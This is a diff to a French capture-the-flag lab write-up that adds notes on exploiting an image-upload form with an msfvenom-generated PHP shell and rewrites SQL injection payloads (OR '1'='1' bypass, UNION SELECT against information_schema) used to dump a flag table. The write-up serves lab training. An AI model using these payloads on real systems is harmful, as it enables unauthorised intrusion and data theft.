@@ -248,6 +248,8 @@ cat flag.txt
 
 Le flag de cette machine est : ` AST16{d3f4u17_cr3d5_3v3rywh3r3}`
 
+> Source : https://pentestlab.blog/2012/03/22/apache-tomcat-exploitation/
+
 
 
 #### Host 10.10.40.128
@@ -265,7 +267,9 @@ PORT   STATE    SERVICE VERSION
 80/tcp open     http    Apache httpd 2.2.11 ((Ubuntu) PHP/5.2.6-3ubuntu4 with Suhosin-Patch)
 ````
 
-.......................
+On peut voir qu'on a un serveur Apache qui tourne sur le port 80. Nous nous sommes donc connecté via un client web. Sur cette page, on a pu constater qu'il y a avait un formulaire pour upload une "image" sur le serveur. Nous sommes donc partie sur l'idée d'injecter un fichier contenant un shell. 
+
+Pour créer un fichier contenant notre shell, nous avons utilisé `msfvenom`.
 
 ```shell
 #Générer un shell dans un fichier php
@@ -310,6 +314,8 @@ find / -name '*flag*'
 
 Dans le dossier `/root`, on peut trouver le fichier `flag.txt`. Avec la commande `cat flag.txt`, on trouve le flag suivant : `AST16{up104d_w17h_57y13_15_n07_3n0u6h}`.
 
+> source : https://www.youtube.com/watch?v=by-Z1EKwgTs
+
 
 
 #### Host 10.10.40.138
@@ -342,19 +348,19 @@ Nous avons donc recréé le `cookie` et l'avons modifié afin d'injecter nos req
 
 ``````mysql
 #1. création d'un cookie
-'password' OR 1=1' 
+#Connexion avec un compte qu'on a créé (user = coucou)
 
-#2. affiche tous les users
-admin' OR '' =':' OR '' = '  
+#2. affiche tous les users 
+coucou' OR '1' = '1'#
 
 #3. affiche les tables et leur nom
-admin' UNION SELECT table_schema, table_name, 1 FROM information_schema.tables#: 
+'UNION SELECT table_schema, table_name, 1 FROM information_schema.tables#: 
 
 #4. Recherche les columns sur la table s3cr3t
-admin' UNION SELECT table_schema, table_name, column_name FROM information_schema.columns WHERE table_name = 's3cr3t_t4ble'#:
+'UNION SELECT table_schema, table_name, column_name FROM information_schema.columns WHERE table_name = 's3cr3t_t4ble'#:
 
 #5. Affiche le contenu de la colone fl4g
-admin' UNION SELECT fl4g, 1, 2 FROM s3cr3t_t4ble#:
+'UNION SELECT fl4g, 1, 2 FROM s3cr3t_t4ble#:
 
 #flag = EHK17{1a86ff7923c40c9ccd806ee5036d363c068ccc4d}
 ``````
@@ -394,7 +400,11 @@ vim /etc/hosts
 
 
 
-nslookup
+
+
+
+
+
 
 #### Host 10.10.40.231
 
@@ -422,11 +432,6 @@ PORT      STATE    SERVICE
 0/tcp     filtered unknown
 22/tcp    open     ssh
 60001/tcp open     unknown
-
-Read data files from: /usr/bin/../share/nmap
-Nmap done: 1 IP address (1 host up) scanned in 18.20 seconds
-           Raw packets sent: 65718 (2.892MB) | Rcvd: 65537 (2.621MB)
-
 ``````
 
 Nous avons essayé de nous connecter via `nc` sur le port 60001. Nous avons donc eu la sortie suivante :
@@ -452,6 +457,10 @@ Dans le répertoire `/home/ast20/note_service/share`, on retrouve le binaire `ch
 
 
 
+Etape manquante : reverse le fichier `chall`
+
+
+
 ------
 
 ##### Sources :
@@ -459,3 +468,4 @@ Dans le répertoire `/home/ast20/note_service/share`, on retrouve le binaire `ch
 reverse shell : https://docs.j7k6.org/php-reverse-shell-metasploit/
 
 augmenter les privilèges : https://www.youtube.com/watch?v=by-Z1EKwgTs
+
